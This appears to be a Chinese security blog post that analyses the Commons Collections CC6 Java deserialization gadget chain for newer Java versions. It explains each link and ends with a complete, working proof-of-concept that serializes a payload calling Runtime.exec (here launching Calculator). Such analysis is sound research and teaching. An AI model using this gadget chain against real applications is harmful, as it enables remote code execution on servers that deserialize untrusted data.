# [Java安全] CommonsCollections6链分析




# 前言

之前我们分析了CC1，从简化版开始学习，再到完整分析CC1，再学习了动态代理和LazyMap的利用链构造，但是都有一个缺陷就是版本限制，只能适用于8u71之前的链子，因为AnnotationInvocationHandler的readObject方法发生了改变，CC6就是为了高版本Java的利用问题



# CC6

这里我还是跟着p牛的Java安全漫谈来学习，这里p牛是简化了ysoserial的CC6利用链，gadget是这样的

![image-20221002161146283](https://tuchuang.huamang.xyz/img/image-20221002161146283.png)

我们从后往前看，可以发现还是走了`LazyMap.get()`方法，在CC1中，我们是通过动态代理Map，从`AnnotationInvocationHandler.readObject`调用`this.memberValues.entrySet()`然后到`AnnotationInvocationHandler.invoke()`再调用到get方法

而高版本的readObject逻辑已经修改了，不能走这条路了，观察CC6的gadget，这里走了`org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()`

我们跟进TiedMapEntry去看看，执行了`this.map.get(this.key)`，我们实例化的时候是可以操控map和key的的

而且他的`hashCode`方法又执行了`this.getValue()`

```java
public class TiedMapEntry implements Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;

    public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }
		// ...
    public Object getValue() {
        return this.map.get(this.key);
    }
		// ...
    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
  	// ...
```

所以现在的目的就变成了找到哪里调用了`TiedMapEntry#hashCode`，看到gadget是调用了`HashMap.hash()`方法这其实就是接上了之前学习的[URLDNS链子](https://blog.huamang.xyz/urldns)

在HashMap的readObject中调用了

```java
putVal(hash(key), key, value, false, false)
```

跟进hash方法，调用了key.hashCode()

```java
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
```

所以我们**控制key为TiedMapEntry的对象**即可

# POC

首先是创建好我们的恶意Map

```java
Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}),
        new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator" }),
};
Transformer transformerChain = new ChainedTransformer(transformers);
Map innerMap = new HashMap();
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```

然后就是这次的主角TiedMapEntry登场了，我们需要他的hashCode方法，调用到他的hashCode方法的途径是HashMap的readObject里面的hash(key)

所以我们实例化TiedMapEntry，把恶意的Map传入作为map参数，key是啥无所谓，因为要进ChainedTransformer，然后再把这个TiedMapEntry**作为key传入**HashMap中，这样就调用到了`TiedMapEntry#hashCode()`

```java
TiedMapEntry tme = new TiedMapEntry(outerMap,"key");
HashMap expMap = new HashMap();
expMap.put(tme,"value");
```

## 注意点1

看ysoserial代码可以发现，他构造ChainedTransformer的时候，是这样的，多了一个

`new ConstantTransformer(1)` 

![image-20221002195409931](https://tuchuang.huamang.xyz/img/image-20221002195409931.png)

起初我没觉得有什么，后来到了分析CC6的链子的时候，我发现会报错

原因是java.lang.UNIXProcess不能被序列化

![image-20221002195706140](https://tuchuang.huamang.xyz/img/image-20221002195706140.png)

这里我调试跟进去看了一下，如果POC和之前一样的话，这里是返回UNIX对象的

![image-20221002200458055](https://tuchuang.huamang.xyz/img/image-20221002200458055.png)

因为CC6的最后需要把恶意的代码加进一个新的Map里面去，然后再对这个Map进行序列化，所以这里就会因为UNIXProcess没有基础serializable而触发报错了

![image-20221002200537033](https://tuchuang.huamang.xyz/img/image-20221002200537033.png)

所以我们的解决办法就是在后面再加上一个`new ConstantTransformer(1)`，这样返回的就是可序列化的对象了

![image-20221002200921497](https://tuchuang.huamang.xyz/img/image-20221002200921497.png)



## 注意点2



链子基本就是这样了，但是有一点要注意的是，如果直接拿expMap去生成序列化数据，**是不会RCE的**

原因在这，当我们进入LazyMap的get方法的时候，他这个判断条件过不去，不会进入执行factory.transform方法

![image-20221002183348955](https://tuchuang.huamang.xyz/img/image-20221002183348955.png)

原因是在构造新的Map的时候，我们执行了一次`expMap.put(tme,"value");`，把恶意数据put进Map中，在执行这个方法的时候会走进LazyMap的get方法，再插入一个数据进去，`{"key",1}`

![image-20221002202725130](https://tuchuang.huamang.xyz/img/image-20221002202725130.png)

所以当我们反序列化以后的恶意的outerMap要去执行get的时候，就会因为里面有值而过不了判断执行不了transform

![image-20221002202619587](https://tuchuang.huamang.xyz/img/image-20221002202619587.png)

解决办法就是在`expMap.put(tme,"value");`的后面去把outerMap的内容删除即可

最后的POC

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws ClassNotFoundException, IOException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap,"key");
        HashMap expMap = new HashMap();
        expMap.put(tme,"value");
        outerMap.remove("key");
        FileOutputStream fileInputStream = new FileOutputStream(new File("./1.txt"));
        ObjectOutputStream oos = new ObjectOutputStream(fileInputStream);
        oos.writeObject(expMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File("./1.txt")));
        Object o = (Object) ois.readObject();
    }
}

```

